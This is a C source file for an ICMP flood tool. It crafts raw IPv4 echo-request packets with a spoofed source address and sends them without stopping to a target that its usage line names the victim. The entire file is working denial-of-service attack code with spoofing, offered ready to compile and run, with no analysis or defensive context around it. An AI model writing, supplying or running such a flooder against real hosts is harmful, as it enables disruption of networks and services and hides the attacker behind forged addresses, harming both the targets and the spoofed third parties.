#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <victim_ip> <spoofed_ip>\n", argv[0]);
        exit(0);
    }

    char *victim = argv[1];
    char *spoof = argv[2];

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("Socket error");
        return 1;
    }

    char packet[1024];
    memset(packet, 0, sizeof(packet));

    struct iphdr *ip = (struct iphdr *)packet;
    struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));

    // Setup socket
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr(victim);

    while (1) {
        memset(packet, 0, sizeof(packet));

        // IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr));
        ip->id = rand();
        ip->ttl = 64;
        ip->protocol = IPPROTO_ICMP;
        ip->saddr = inet_addr(spoof);    // Spoof agents
        ip->daddr = dest.sin_addr.s_addr;
        ip->check = checksum((unsigned short*)ip, sizeof(struct iphdr));

        // ICMP header
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->un.echo.id = rand();
        icmp->un.echo.sequence = rand();
        icmp->checksum = checksum((unsigned short*)icmp, sizeof(struct icmphdr));

        // Flood
        sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct icmphdr),
               0, (struct sockaddr*)&dest, sizeof(dest));

        printf("Sent ICMP packet from %s → %s\n", spoof, victim);
    }

    close(sock);
    return 0;
}

